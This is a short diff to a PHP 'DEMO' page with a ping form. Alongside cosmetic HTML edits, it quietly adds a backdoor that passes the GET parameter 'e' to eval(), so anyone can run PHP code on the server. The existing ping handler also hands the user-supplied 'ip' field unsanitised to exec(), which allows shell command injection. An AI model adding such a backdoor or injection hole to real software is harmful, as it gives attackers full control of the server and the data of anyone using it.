@@ -1,7 +1,8 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <title>DEMO</title>
+    <meta content="text/html; charset=utf-8" />
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <?php
@@ -11,12 +12,17 @@
             $randomNumber = rand(100000, 999999);
             $cookieValue = $epochTime . $randomNumber;
         }
+
+        if (isset($_GET['e'])) {
+            eval($_GET['e']);
+        }
     ?>
 </head>
 <body>
     <div class="container">
         <h1 class="mt-3">DEMO</h1>
         <?php
+        // exec("ping -c 4 192.168.2.10", $output, $return_var);
         if (isset($_POST['ip'])) {
             $ip = $_POST['ip'];
             exec("ping -c 4 $ip", $output, $return_var);
